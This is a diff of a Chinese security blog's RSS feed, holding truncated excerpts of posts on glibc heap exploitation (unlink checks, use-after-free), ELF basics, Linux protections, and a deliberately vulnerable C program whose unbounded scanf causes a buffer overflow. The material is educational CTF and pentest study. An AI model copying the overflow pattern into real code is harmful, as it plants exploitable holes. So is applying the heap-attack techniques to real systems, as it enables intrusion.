+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">struct&lt;/span> malloc_state
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Serialize access. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">__libc_lock_define&lt;/span> (, mutex);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Flags (formerly in max_fast). */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">int&lt;/span> flags;&lt;span style="color:#6272a4">//0x4
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">&lt;/span> &lt;span style="color:#6272a4">/* Set if the fastbin chunks contain recently inserted free blocks. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Note this is a bool but not all targets support atomics on booleans. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">int&lt;/span> have_fastchunks;&lt;span style="color:#6272a4">//0x4
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">&lt;/span> &lt;span style="color:#6272a4">/* Fastbins */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mfastbinptr fastbinsY[NFASTBINS];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Base of the topmost chunk -- not otherwise kept in a bin */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mchunkptr top;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* The remainder from the most recent split of a small request */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mchunkptr last_remainder;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Normal bins packed as described above */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mchunkptr bins[NBINS &lt;span style="color:#ff79c6">*&lt;/span> &lt;span style="color:#bd93f9">2&lt;/span> &lt;span style="color:#ff79c6">-&lt;/span> &lt;span style="color:#bd93f9">2&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Bitmap of bins */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">unsigned&lt;/span> &lt;span style="color:#8be9fd">int&lt;/span> binmap[BINMAPSIZE];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Linked list */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">struct&lt;/span> malloc_state &lt;span style="color:#ff79c6">*&lt;/span>next;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Linked list for free arenas. Access to this field is serialized
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> by free_list_lock in arena.c. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">struct&lt;/span> malloc_state &lt;span style="color:#ff79c6">*&lt;/span>next_free;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Number of threads attached to this arena. 0 if the arena is on
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> the free list. Access to this field is serialized by
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> free_list_lock in arena.c. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> INTERNAL_SIZE_T attached_threads;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Memory allocated from the system in this arena. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> INTERNAL_SIZE_T system_mem;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> INTERNAL_SIZE_T max_system_mem;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>存在bss section&lt;/li>
+&lt;/ul>
+&lt;h2 id="2-exploitation">2. Exploitation&lt;/h2>
+&lt;ul>
+&lt;li>即使&lt;a href="https://ja-errorpro.codes/posts/2023/linux_system_security">保護機制&lt;/a>全開也能攻擊&lt;/li>
+&lt;li>目標是改到fd&lt;/li>
+&lt;/ul>
+&lt;h3 id="unlink">Unlink&lt;/h3>
+&lt;ul>
+&lt;li>為了避免chunk太碎，free的時候會檢查周圍的chunk是否為free然後merge&lt;/li>
+&lt;li>早期版本(libc-2.23? 大概2004年以前)不會檢查fd、bk、size是否正常，可以做unlink attack&lt;/li>
+&lt;li>現在多了這段檢查，繞過很麻煩，已經很難打了，除非沒更新&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>FD &lt;span style="color:#ff79c6">=&lt;/span> P&lt;span style="color:#ff79c6">-&amp;gt;&lt;/span>fd; &lt;span style="color:#6272a4">// P is the chunk to be freed
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">&lt;/span>BK &lt;span style="color:#ff79c6">=&lt;/span> P&lt;span style="color:#ff79c6">-&amp;gt;&lt;/span>bk;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">/* 檢查size */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#50fa7b">__builtin_expect&lt;/span> (&lt;span style="color:#50fa7b">chunksize&lt;/span>(P) &lt;span style="color:#ff79c6">!=&lt;/span> &lt;span style="color:#50fa7b">prev_size&lt;/span> (&lt;span style="color:#50fa7b">next_chunk&lt;/span>(P)), &lt;span style="color:#bd93f9">0&lt;/span>))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">malloc_printerr&lt;/span> (&lt;span style="color:#f1fa8c">&amp;#34;corrupted size vs. prev_size&amp;#34;&lt;/span>); 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">/* 檢查fd、bk */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#50fa7b">__builtin_expect&lt;/span> (FD&lt;span style="color:#ff79c6">-&amp;gt;&lt;/span>bk &lt;span style="color:#ff79c6">!=&lt;/span> P &lt;span style="color:#ff79c6">||&lt;/span> BK&lt;span style="color:#ff79c6">-&amp;gt;&lt;/span>fd &lt;span style="color:#ff79c6">!=&lt;/span> P, &lt;span style="color:#bd93f9">0&lt;/span>))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">malloc_printerr&lt;/span> (check_action, &lt;span style="color:#f1fa8c">&amp;#34;corrupted double-linked list&amp;#34;&lt;/span>, P, AV);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="use-after-free">Use After Free&lt;/h3>
+&lt;ul>
+&lt;li>記憶體被釋放後還被使用&lt;/li>
+&lt;/ul>
+&lt;p>三種情況：&lt;/p></description></item><item><title>【CTF】CTF工具集</title><link>https://ja-errorpro.codes/posts/2023/ctf_tools/</link><pubDate>Sun, 12 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/ctf_tools/</guid><description>&lt;h1 id="ctf工具集">CTF工具集&lt;/h1>
 &lt;h2 id="基本工具">基本工具&lt;/h2>
 &lt;ul>
 &lt;li>Python 2+3 &amp;amp; pip&lt;/li>
@@ -1380,7 +2478,47 @@ combine the AI and CTI applications.&lt;/p>
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【系統安全】Linux 安全機制</title><link>https://ja-errorpro.codes/posts/2023/linux_system_security/</link><pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/linux_system_security/</guid><description>&lt;h2 id="address-space-layout-randomizationaslr">Address space layout randomization(ASLR):&lt;/h2>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&amp;gt; gcc a.c -o a.o
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; gcc b.c -static -o b.o
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; gcc c.c -c -o c.o
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; gcc d.c -fPIC d.c -o d.o &lt;span style="color:#ff79c6">&amp;amp;&amp;amp;&lt;/span> gcc d.o -shared -o d.so
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">#####&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; file a.o
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>a.o: ELF 64-bit LSB relocatable, x86-64, version &lt;span style="color:#bd93f9">1&lt;/span> &lt;span style="color:#ff79c6">(&lt;/span>SYSV&lt;span style="color:#ff79c6">)&lt;/span>, dynamically linked, not stripped
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; file b.o
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b.o: ELF 64-bit LSB executable, x86-64, version &lt;span style="color:#bd93f9">1&lt;/span> &lt;span style="color:#ff79c6">(&lt;/span>SYSV&lt;span style="color:#ff79c6">)&lt;/span>, statically linked, not stripped
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; file c.o
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c.o: ELF 64-bit LSB relocatable, x86-64, version &lt;span style="color:#bd93f9">1&lt;/span> &lt;span style="color:#ff79c6">(&lt;/span>SYSV&lt;span style="color:#ff79c6">)&lt;/span>, not stripped
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; file d.o
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d.o: ELF 64-bit LSB relocatable, x86-64, version &lt;span style="color:#bd93f9">1&lt;/span> &lt;span style="color:#ff79c6">(&lt;/span>SYSV&lt;span style="color:#ff79c6">)&lt;/span>, dynamically linked, not stripped
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>可執行檔(Executable)
+&lt;ul>
+&lt;li>程式&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>可重定位檔(Relocatable)
+&lt;ul>
+&lt;li>還沒連結的目的檔&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>共用目的檔(Shared Object)
+&lt;ul>
+&lt;li>動態連結檔案&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="檔案結構">檔案結構&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>File Header&lt;/p></description></item><item><title>【系統安全】Linux 安全機制</title><link>https://ja-errorpro.codes/posts/2023/linux_system_security/</link><pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/linux_system_security/</guid><description>&lt;h2 id="address-space-layout-randomizationaslr">Address space layout randomization(ASLR):&lt;/h2>
 &lt;p>記憶體隨機載入，會把.stack section, .so section, mmap()隨機化，可以防止攻擊者跳到指定記憶體任意利用&lt;/p>
 &lt;p>繞過：目前沒有很好的繞過方法，只能靠運氣猜記憶體在哪&lt;/p>
 &lt;h2 id="stack-canary">Stack Canary:&lt;/h2>
@@ -1515,7 +2653,46 @@ combine the AI and CTI applications.&lt;/p>
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【資訊安全】Metasploitable3 環境建置(Windows VMware)</title><link>https://ja-errorpro.codes/posts/2022/metasploitable3_installation/</link><pubDate>Tue, 29 Nov 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/metasploitable3_installation/</guid><description>&lt;h2 id="需求">需求&lt;/h2>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">char&lt;/span> &lt;span style="color:#50fa7b">convert_case&lt;/span>(&lt;span style="color:#8be9fd">char&lt;/span> c, &lt;span style="color:#8be9fd">int&lt;/span> f){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">char&lt;/span> ret;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span>( c &lt;span style="color:#ff79c6">&amp;lt;&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#ff79c6">||&lt;/span> c &lt;span style="color:#ff79c6">&amp;gt;&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;z&amp;#39;&lt;/span> ){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span>( c &lt;span style="color:#ff79c6">&amp;lt;&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;A&amp;#39;&lt;/span> &lt;span style="color:#ff79c6">||&lt;/span> c &lt;span style="color:#ff79c6">&amp;gt;&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;Z&amp;#39;&lt;/span> )
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	 ret &lt;span style="color:#ff79c6">=&lt;/span> a;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">else&lt;/span> &lt;span style="color:#ff79c6">if&lt;/span>(f &lt;span style="color:#ff79c6">%&lt;/span> &lt;span style="color:#bd93f9">2&lt;/span> &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#bd93f9">0&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	 ret &lt;span style="color:#ff79c6">=&lt;/span> a;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	 ret &lt;span style="color:#ff79c6">=&lt;/span> a &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#bd93f9">32&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">else&lt;/span> &lt;span style="color:#ff79c6">if&lt;/span>( f &lt;span style="color:#ff79c6">%&lt;/span> &lt;span style="color:#bd93f9">2&lt;/span> &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#bd93f9">0&lt;/span> )
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#ff79c6">=&lt;/span> a &lt;span style="color:#ff79c6">-&lt;/span> &lt;span style="color:#bd93f9">32&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#ff79c6">=&lt;/span> a;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> ret;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">do_stuff&lt;/span>(){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">char&lt;/span> garbage;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">char&lt;/span> str[&lt;span style="color:#bd93f9">112&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">scanf&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;%[^&lt;/span>&lt;span style="color:#f1fa8c">\n&lt;/span>&lt;span style="color:#f1fa8c">]&amp;#34;&lt;/span>, str);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">scanf&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;%c&amp;#34;&lt;/span>, &lt;span style="color:#ff79c6">&amp;amp;&lt;/span>garbage);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">for&lt;/span>(&lt;span style="color:#8be9fd">int&lt;/span> i &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0&lt;/span>; i &lt;span style="color:#ff79c6">&amp;lt;&lt;/span> &lt;span style="color:#bd93f9">100&lt;/span> ; i&lt;span style="color:#ff79c6">++&lt;/span>){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> str[i] &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#50fa7b">convert_case&lt;/span>(str[i], i);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">puts&lt;/span>(str);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// puts(歡迎訊息);
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">&lt;/span>	&lt;span style="color:#ff79c6">do&lt;/span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	 &lt;span style="color:#50fa7b">do_stuff&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}&lt;span style="color:#ff79c6">while&lt;/span>(&lt;span style="color:#8be9fd;font-style:italic">true&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>在函式do_stuff()裡，&lt;code>scanf(&amp;quot;%[^\n]&amp;quot;, str)&lt;/code> 的意思是會一直讀到換行為止然後塞進 str，
+沒有限制輸入長度因此出現Buffer Overflow漏洞&lt;/p></description></item><item><title>【資訊安全】Metasploitable3 環境建置(Windows VMware)</title><link>https://ja-errorpro.codes/posts/2022/metasploitable3_installation/</link><pubDate>Tue, 29 Nov 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/metasploitable3_installation/</guid><description>&lt;h2 id="需求">需求&lt;/h2>
 &lt;ul>
 &lt;li>Windows 10 up&lt;/li>
 &lt;li>VMware Workstation Pro&lt;/li>
@@ -1533,7 +2710,17 @@ combine the AI and CTI applications.&lt;/p>
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【資訊安全】Metasploitable2 滲透測試實作(筆記)</title><link>https://ja-errorpro.codes/posts/2022/metasploitable2_vsftpd/</link><pubDate>Wed, 23 Nov 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/metasploitable2_vsftpd/</guid><description>&lt;h2 id="先備知識">先備知識&lt;/h2>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
